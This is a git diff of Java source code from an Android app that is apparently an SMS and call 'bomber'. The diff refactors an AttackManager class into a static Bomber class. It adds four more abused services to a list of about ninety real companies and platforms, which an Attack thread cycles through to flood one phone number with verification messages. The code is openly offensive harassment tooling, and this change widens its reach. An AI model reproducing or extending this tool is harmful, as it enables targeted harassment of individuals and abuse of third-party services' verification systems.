@@ -8,6 +8,7 @@ import com.dm.bomber.services.BCS;
 import com.dm.bomber.services.Baucenter;
 import com.dm.bomber.services.BelkaCar;
 import com.dm.bomber.services.Benzuber;
+import com.dm.bomber.services.Biua;
 import com.dm.bomber.services.Boxberry;
 import com.dm.bomber.services.CarSmile;
 import com.dm.bomber.services.ChestnyZnak;
@@ -41,6 +42,7 @@ import com.dm.bomber.services.MBK;
 import com.dm.bomber.services.MFC;
 import com.dm.bomber.services.MTS;
 import com.dm.bomber.services.Magnit;
+import com.dm.bomber.services.MdFashion;
 import com.dm.bomber.services.MegaDisk;
 import com.dm.bomber.services.MegafonTV;
 import com.dm.bomber.services.Metro;
@@ -81,9 +83,11 @@ import com.dm.bomber.services.TikTok;
 import com.dm.bomber.services.Tinder;
 import com.dm.bomber.services.Tinkoff;
 import com.dm.bomber.services.ToGO;
+import com.dm.bomber.services.Uchiru;
 import com.dm.bomber.services.Ukrzoloto;
 import com.dm.bomber.services.VKWorki;
 import com.dm.bomber.services.Wink;
+import com.dm.bomber.services.XtraTV;
 import com.dm.bomber.services.Yandex;
 import com.dm.bomber.services.YandexEda;
 import com.dm.bomber.services.Yarche;
@@ -100,75 +104,42 @@ import java.util.List;
 import java.util.concurrent.CountDownLatch;
 
 import okhttp3.Call;
-import okhttp3.OkHttpClient;
-import okhttp3.Request;
 import okhttp3.Response;
 
-public class AttackManager {
-    private static final String TAG = "AttackManager";
+public class Bomber {
+    private static final String TAG = "Bomber";
+    private static final Service[] services = new Service[]{
+            new Kari(), new Modulebank(), new YandexEda(),
+            new GloriaJeans(), new Telegram(), new MTS(), new CarSmile(),
+            new Eldorado(), new Tele2TV(), new MegafonTV(), new YotaTV(),
+            new Fivepost(), new Askona(), new FarforCall(), new Sephora(),
+            new Ukrzoloto(), new Olltv(), new Wink(), new Lenta(),
+            new Pyaterochka(), new ProstoTV(), new Multiplex(), new RendezVous(),
+            new Zdravcity(), new Robocredit(), new Yandex(), new InDriver(),
+            new Tinder(), new Gosuslugi(), new Tele2(), new Zoloto585(),
+            new Hoff(), new N1RU(), new Samokat(), new GreenBee(),
+            new ToGO(), new Premier(), new Gorparkovka(), new Tinkoff(),
+            new MegaDisk(), new KazanExpress(), new FoodBand(),
+            new Benzuber(), new Citimobil(), new HHru(), new TikTok(),
+            new Ozon(), new MFC(), new EKA(), new OK(), new MBK(),
+            new VKWorki(), new Magnit(), new SberZvuk(), new Smotrim(),
+            new BApteka(), new HiceBank(), new Evotor(), new Sportmaster(),
+            new RiveGauche(), new Yarche(), new Baucenter(), new Dolyame(),
+            new GoldApple(), new FriendsClub(), new ChestnyZnak(), new DvaBerega(),
+            new MoeZdorovie(), new Sokolov(), new Boxberry(), new Discord(),
+            new Privileges(), new NearKitchen(), new Citydrive(), new BelkaCar(),
+            new Mozen(), new MosMetro(), new BCS(), new Dostavista(),
+            new Metro(), new Niyama(), new RabotaRu(), new Sunlight(),
+            new Mokka(), new FarforSMS(), new Stolichki(), new Mirkorma(),
+            new YooMoney(), new Uchiru(), new Biua(), new MdFashion(),
+            new XtraTV()
+    };
 
-    private final Service[] services;
-
-    private Attack attack;
-    private final Callback callback;
-
-    public AttackManager(Callback callback) {
-        Service.client = new OkHttpClient.Builder()
-                .addInterceptor(chain -> {
-                    Request request = chain.request();
-                    Log.v(TAG, String.format("Sending request %s", request.url()));
-
-                    Response response = chain.proceed(request);
-                    Log.v(TAG, String.format("Received response for %s with status code %s",
-                            response.request().url(), response.code()));
-
-                    return response;
-                }).build();
-
-        this.callback = callback;
-        this.services = new Service[]{
-                new Kari(), new Modulebank(), new YandexEda(),
-                new GloriaJeans(), new Telegram(), new MTS(), new CarSmile(),
-                new Eldorado(), new Tele2TV(), new MegafonTV(), new YotaTV(),
-                new Fivepost(), new Askona(), new FarforCall(), new Sephora(),
-                new Ukrzoloto(), new Olltv(), new Wink(), new Lenta(),
-                new Pyaterochka(), new ProstoTV(), new Multiplex(), new RendezVous(),
-                new Zdravcity(), new Robocredit(), new Yandex(), new InDriver(),
-                new Tinder(), new Gosuslugi(), new Tele2(), new Zoloto585(),
-                new Hoff(), new N1RU(), new Samokat(), new GreenBee(),
-                new ToGO(), new Premier(), new Gorparkovka(), new Tinkoff(),
-                new MegaDisk(), new KazanExpress(), new FoodBand(),
-                new Benzuber(), new Citimobil(), new HHru(), new TikTok(),
-                new Ozon(), new MFC(), new EKA(), new OK(), new MBK(),
-                new VKWorki(), new Magnit(), new SberZvuk(), new Smotrim(),
-                new BApteka(), new HiceBank(), new Evotor(), new Sportmaster(),
-                new RiveGauche(), new Yarche(), new Baucenter(), new Dolyame(),
-                new GoldApple(), new FriendsClub(), new ChestnyZnak(), new DvaBerega(),
-                new MoeZdorovie(), new Sokolov(), new Boxberry(), new Discord(),
-                new Privileges(), new NearKitchen(), new Citydrive(), new BelkaCar(),
-                new Mozen(), new MosMetro(), new BCS(), new Dostavista(),
-                new Metro(), new Niyama(), new RabotaRu(), new Sunlight(),
-                new Mokka(), new FarforSMS(), new Stolichki(), new Mirkorma(),
-                new YooMoney()
-                // TODO: Ostin, ICQ, SushiWok, VoprosRU
-        };
-    }
-
-    public void performAttack(String phoneCode, String phone, int cycles) {
-        attack = new Attack(phoneCode, phone, cycles);
-        attack.start();
-    }
-
-    public boolean hasAttack() {
+    public static boolean isAlive(Attack attack) {
         return attack != null && attack.isAlive();
     }
 
-    public void stopAttack() {
-        attack.interrupt();
-        Service.client.dispatcher().cancelAll();
-    }
-
-    public List<Service> getUsableServices(String phoneCode) {
+    public static List<Service> getUsableServices(String phoneCode) {
         List<Service> usableServices = new ArrayList<>();
 
         for (Service service : services) {
@@ -187,7 +158,8 @@ public class AttackManager {
         void onProgressChange(int progress);
     }
 
-    private class Attack extends Thread {
+    public static class Attack extends Thread {
+        private final Callback callback;
         private final String phoneCode;
         private final String phone;
         private final int numberOfCycles;
@@ -196,12 +168,13 @@ public class AttackManager {
 
         private CountDownLatch tasks;
 
-        public Attack(String phoneCode, String phone, int cycles) {
+        public Attack(Callback callback, String phoneCode, String phone, int cycles) {
             super(phone);
 
             this.phoneCode = phoneCode;
             this.phone = phone;
             this.numberOfCycles = cycles;
+            this.callback = callback;
         }
 
         @Override
